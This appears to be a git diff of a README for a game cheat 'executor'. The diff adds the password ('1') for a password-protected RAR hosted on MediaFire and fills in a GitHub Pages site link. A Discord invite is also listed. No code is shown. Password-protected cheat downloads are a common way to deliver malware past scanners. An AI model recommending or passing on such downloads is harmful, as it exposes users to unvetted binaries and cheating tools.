@@ -7,12 +7,15 @@ Hi, I'm 0x1 default. I created this excuator for people who can't or don't have 
 
 Link Of Download : https://www.mediafire.com/file/7a2ow42tp1vxpun/0x1cheat.rar/file
 
+Rar Pass : 1
+ق
+
 # Discord
 
 My Server Discord : https://discord.gg/yUU3JEtJ2p
 
 # My Site
 
-My Site : 
+My Site : https://0x1default.github.io/0x1site.github.io/
 
 
